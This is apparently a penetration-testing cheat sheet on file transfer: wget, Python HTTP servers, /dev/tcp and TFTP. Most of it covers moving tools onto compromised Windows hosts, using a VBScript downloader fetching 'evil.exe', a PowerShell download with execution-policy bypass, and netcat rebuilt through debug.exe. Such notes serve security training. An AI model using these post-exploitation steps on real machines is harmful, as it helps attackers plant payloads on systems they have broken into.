# SimpleHTTPServer 

``
python -m SimpleHTTPServer 8000
``

Or customizing:

```python
#!/bin/python
import SimpleHTTPServer
import SocketServer

PORT = 8000

Handler = SimpleHTTPServer.SimpleHTTPRequestHandler

httpd = SocketServer.TCPServer(("", PORT), Handler)

print "serving at port", PORT
httpd.serve_forever()
```
---
# Download with wget

### Continue an Incomplete Download
``
wget -c file
``

### Mirror an Entire Website
``
wget -m http://example.com
``

options:

* ``--convert-links`` changes links inside each downloaded page so that they point to each other, not the web.

* ``--page-requisites`` downloads things like style sheets, so pages will look correct offline.
* ``--no-parent`` stops wget from downloading parent sites. So if you want to download http://example.com/subexample, you won’t end up with the parent page.

### Download an Entire Directory
``
wget -r ftp://example.com/folder
``

### Download a List of Files at Once
``
wget -i download.txt
``

Few other options:

* ``-b`` :run then download in the background.
* ``-t 10`` :keep trying to download even if there is a 404 error. will try to download 10 times;
* ``--limit-rate=200k`` :Limit the download bandwidth speed at 200KB/s.

---
# /dev/tcp examples 

### Downloading a URL via /dev/tcp:
``
$ exec 5<>/dev/tcp/www.net.cn/80
$ echo -e "GET / HTTP/1.0\n" >&5
$ cat <&5
``

---------------------

# Start Kali FTP Daemon
### 1 Install atftpd

Install atftpd package. Disable inetd and run systemd service. /srv/tftp is used for TFTP server directory.

```bash
$ sudo apt install -y atftpd
$ sudo sed -e 's/^USE_INETD=true/USE_INETD=false/g' -i /etc/default/atftpd
$ sudo systemctl enable atftpd
$ sudo systemctl restart atftpd
```

---------------------
# Transferring Files to Windows(4)

### TFTP (Windows XP & Windows 2003)
A TFTP client is installed by default on windows machines up to Windows XP and Windows 2003. What is good about TFTP is that you can use it non-interactively. Which means less risk of losing your shell.

```
tftp -i 192.160.1.101 GET wget.exe
```

From linux to test the server:

```
from Linux
```

To make a VBScript clone of wget:

`
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
`

You then execute the script like this:

`
cscript wget.vbs http://192.168.10.5/evil.exe evil.exe
`

### PowerShell

This is how we can download a file using PowerShell. Remember since we only have a non-interactive shell we cannot start PowerShell.exe, because our shell can't handle that. But we can get around that by creaing a PowerShell-script and then executing the script:

`
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://192.168.1.101/file.exe" >>wget.ps1
echo $file = "output-file.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
`

Now we invoke it with this crazy syntax:

`
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
`

### Debug.exe

This is a crazy technique that works on windows 32 bit machines. Basically the idea is to use the debug.exe program. It is used to inspect binaries, like a debugger. But it can also rebuild them from hex. So the idea is that we take a binaries, like netcat. And then disassemble it into hex, paste it into a file on the compromised machine, and then assemble it with debug.exe.

Debug.exe can only assemble 64 kb. So we need to use files smaller than that. We can use upx to compress it even more. So let's do that:

```
upx -9 nc.exe
```
Now it only weights 29 kb. Perfect. So now let's disassemble it:

```
/usr/share/windows-binaries/exe2bat.exe
wine exe2bat.exe nc.exe nc.txt
```

From txt to exe(5):

```console
root@kali:~/Desktop# cat nc.txt
echo n 1.dll >123.hex
echo e 0100 >>123.hex
echo 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 00 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20 6d 6f 64 65 2e 0d 0d 0a 24 00 00 00 00 00 00 00  >>123.hex 
echo e 0180 >>123.hex
.
.
.
   	echo q >>123.hex
debug<123.hex
copy 1.dll nc_from_binary.exe
```

---
#### References:
1. https://www.howtogeek.com/281663/how-to-use-wget-the-ultimate-command-line-downloading-tool/
2. http://fibrevillage.com/scripting/603-dev-tcp-examples-and-trouble-shooting
3. https://docs.python.org/2/library/simplehttpserver.html
4. https://sushant747.gitbooks.io/total-oscp-guide/transfering_files_to_windows.html
5. https://awansec.com/file-transfer.html
